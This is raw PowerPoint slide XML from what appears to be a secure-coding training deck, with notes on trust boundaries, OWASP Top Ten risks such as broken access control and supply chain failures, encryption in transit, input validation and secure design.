            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Tip:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Use the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>fewest levels you can manage well</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (3–5). Too many labels = nobody uses them correctly.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5C818AE-0A83-F954-EB89-B787DE0EBFB1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>29</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3147384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EFE2-7E74-AF66-2A3D-EE085CEEE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1E546-B5C9-EAC8-74F3-2764EC89F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46F1F-4599-B25A-9E68-737BFA9F125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38B5B82-7DE3-FB7F-73B6-F5B2707BBADC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>30</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3589391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4B4B-8B6A-7BF1-48A7-E26E7DC40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8389D-C393-005C-C065-BDC610EEA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29C6C-3504-D015-F5B9-C7C78E637670}"/>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BC8A314-D74C-5A47-E852-70555EEBE1CA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>31</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4135564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1689-B1BB-4FE8-5EF9-4F15A5F00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86122-BE73-1C87-9977-74381E687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44B46-CAC5-BCA4-41EC-046BB0CA4B51}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>i.e. where data or requests move from a less-trusted source to a more-trusted component (or vice versa)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Bugs at trust boundaries become security vulnerabilities (e.g., injection, auth bypass)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>TB's tell you where to validate, authenticate, authorize, sanitize, and log.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>https://owasp.org/www-community/Threat_Modeling_Process#example-diagrams</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F3B2F54-5DB5-1E60-5FF4-E9450235591C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>32</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2947306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AC0FF-FE4F-D755-DAB1-8E86A54ED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6CB99-FF7A-5B5A-263C-D614F988A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AD6B8-0B22-3B85-FD50-FCB676C6E842}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>i.e. where data or requests move from a less-trusted source to a more-trusted component (or vice versa)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Analogy:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Castle walls &amp; gates.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> The wall is the boundary; every gate is a crossing that needs guards (controls), logs (audit), and rules (policies).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Bugs at trust boundaries become security vulnerabilities (e.g., injection, auth bypass). If a different component enforces </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>authn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>authz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, validates input, or ensures integrity, that’s a boundary. Treat it as hostile until proven otherwise.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>TB's tell you where to validate, authenticate, authorize, sanitize, and log.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Practical Example:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Frontend → database (search box)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> • Crossing: User input flows to queries.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> • Risk: SQL/NoSQL injection.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> • Control: Always use parameterized queries/ORM bindings; never string-concatenate. Add read-only DB</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E2AE20E7-6259-1A68-BB51-7D0459BCF4A5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>33</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="899232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5AA14-4A4B-B760-F725-26EBCD16A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66FD8-77F6-EC25-467A-0FE1FB672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21154-1658-0EEE-94C1-16604BD875CC}"/>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1AFF9792-CC6A-070F-B21A-6B1604981018}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>34</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2669797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BBB75-9BD8-BBE0-1E1D-047F4B050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6A9BF-AF62-938D-2C6F-23BB5729A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352DC-9D5C-B2E9-F259-81E36077AAE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2EBD333-D082-7C29-AD2F-7F892CA70DB6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>36</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="208007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4B23-5214-3AF4-A4D3-8762E4F1B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8FBAE-6590-DBC3-61A5-6A29BE99B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B600D-14A1-6B91-6E23-FAD8836919DB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>According to OWASP - Maintaining its position at #1 in the Top Ten, 100% of the applications tested were found to have some form of broken access control</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Access control is only effective when implemented in trusted server-side code or serverless APIs, where the attacker cannot modify the access control check or metadata.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>BAC is largely due to violation of the principle of least privilege, commonly known as deny by default, where access should only be granted for particular capabilities, roles, or users, but is available to anyone.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Can also happen be passing access control checks by modifying the URL (parameter tampering or force browsing), internal application state, or the HTML page, or by using an attack tool that modifies API requests.</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54119768-7205-C26C-0E88-E1866BD82D50}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>37</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2386104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80B9-EE50-AD53-2321-5AA56E3D9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981F5-B40B-E200-C2D3-6C7F8573F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55F19-FE15-4141-51B1-2834E1D80C0A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>According to OWASP - Moving up from #5 in the previous edition, 100% of the applications tested were found to have some form of misconfiguration, with an average incidence rate of 3.00%, and over 719k occurrences of a Common Weakness Enumeration (CWE) in this risk category. With more shifts </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B4106B21-7DEE-AEB6-5D8E-FA86439EB0A9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>38</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="332093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D4AD9-4B65-719D-72DD-3AFE40929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C8154-B78F-3880-C1CC-7C78853D3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53099-4F3F-3E81-2283-1CEA92977D39}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Previously A06 - Vulnerable &amp; Outdated Components</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This was top-ranked in the Top 10 community survey with exactly 50% respondents ranking it #1. Since initially appearing in the 2013 Top 10 as “A9 – Using Components with Known Vulnerabilities”, the risk has grown in scope to include all supply chain failures, not just ones involving known vulnerabilities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>When tested and reported in the contributed data, this category has the highest average incidence rate at 5.19%.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FC3D5DFC-E783-676C-ECCE-3359E9546D99}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>39</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1549423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64D09-040A-D0E4-BFDA-6B4DB5580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774E2-737D-E824-A959-8F1EBF940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F82B9-1015-68FD-5220-938C2F81EB10}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Rule of thumb – All data in transit is travelling a route that </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>IS/HAS BEN </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>compromised by an attacker. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Secure transport means encryption in both directions, using a symmetric key exchange after an asymmetric handshake</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Weak or missing encryption leaks sensitive data.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Always encrypt in transit &amp; at rest.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Avoid deprecated algorithms – NEVER make your own.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Validate certificate chains.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>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BC9C3478-09E5-0A4C-24DF-5A773843BB7F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>40</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6818570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1A93-4284-E1AC-DC25-F96EF7217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43D32-D599-B9E1-FE0C-12821266A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38FD0-B89C-807B-9293-FC887C5CD3C4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>We don’t let unvalidated input into our systems any more than we’d let a stranger into our house</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7BB63911-7874-B8B2-2913-35D7E5CD84E7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>41</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3235079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8965-9DDF-636B-6BAD-6CCD3845E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393C3-1AF0-670E-A0DE-805B35355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10EF1-4AC1-6604-9BCD-49C054E0DDC3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This course is largely based on how to solve this in code.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>No security in the blueprint means no defense in the build.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Model threats early. Build security into architecture, don't staple it on later.</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2941335-5A20-7F49-9F87-920EFEDC38DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>42</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1718923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ED962-292D-531D-2CAA-E668D8084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05380-CF13-1FBB-ACF5-272AE97BA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B7E00-E33C-56B7-1BB4-B6CE929A72D8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Use digital signatures or similar mechanisms to verify the software or data is from the expected source and has not been altered.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Ensure libraries and dependencies, such as npm or Maven, are only consuming trusted repositories. If you have a higher risk profile, consider hosting an internal known-good repository that's vetted.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Ensure that there is a review process for code and configuration changes to minimize the chance that malicious code or configuration could be introduced into your software pipeline.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ensure that your CI/CD pipeline has proper segregation, configuration, and access control to ensure the integrity of the code flowing through the build and deploy processes.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
